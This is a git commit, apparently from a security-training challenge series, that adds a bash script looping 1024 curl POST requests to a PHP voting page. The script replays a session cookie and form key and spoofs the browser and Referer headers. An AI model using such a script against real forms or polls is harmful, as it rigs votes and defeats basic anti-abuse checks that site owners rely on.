1d977cf2305407072994be5b00ef20bd067b06f3
jdeepee <joshuadparkin@gmail.com>
2016-06-06 10:08:55 -0700

    Level 3 done

---
+++ hodor/level_2/script.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+for i in `seq 1 1024`; do curl 'http://173.246.108.142/level2.php' -H 'Cookie: PHPSESSID=fcqnoo51s8kpsm9i5sbepgvgp1; HoldTheDoor=7a5181117234cd65482cbea7c28170a26a6c220b' -H 'Origin: http://173.246.108.142' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: http://173.246.108.142/level2.php' -H 'Connection: keep-alive' --data 'id=14&holdthedoor=Submit&key=7a5181117234cd65482cbea7c28170a26a6c220b' --compressed; done
